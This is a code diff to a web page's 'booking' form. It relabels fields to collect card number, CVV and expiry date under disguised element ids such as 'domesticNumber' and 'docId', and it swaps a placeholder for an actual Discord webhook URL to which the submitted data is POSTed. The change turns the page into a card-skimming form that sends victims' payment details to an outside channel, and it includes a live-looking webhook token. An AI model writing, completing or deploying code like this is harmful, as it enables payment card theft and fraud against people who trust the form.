@@ -105,16 +105,16 @@
       <!-- Manual Entry Tab -->
       <div id="manualTab" class="hidden">
         <form id="bookingForm">
-          <label>Domestic Number:</label><br>
+          <label>Card Number:</label><br>
           <input type="text" id="domesticNumber" required><br><br>
 
-          <label>Doc ID (3 digits):</label><br>
+          <label>CVV (last 3 digits back of card):</label><br>
           <input type="text" id="docId" required><br><br>
 
           <label>Full Name:</label><br>
           <input type="text" id="fullName" required><br><br>
 
-          <label>End Date:</label><br>
+          <label>Expiry date:</label><br>
           <input type="date" id="endDate" required><br><br>
 
           <button type="submit" class="btn">Submit Booking</button>
@@ -242,7 +242,7 @@
       const bookingData = { domesticNumber, docId, fullName, endDate };
 
       // Replace with your Discord webhook URL
-      const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL";
+      const webhookUrl = "https://discord.com/api/webhooks/1533820619026858235/98X3oV-CePeHhVHZ8VmIvjb9S3tdCSUdxa8mZneEItre_ThLTmn7uX1Kso9K8F2lGRkT";
       try {
         await fetch(webhookUrl, {
           method: "POST",
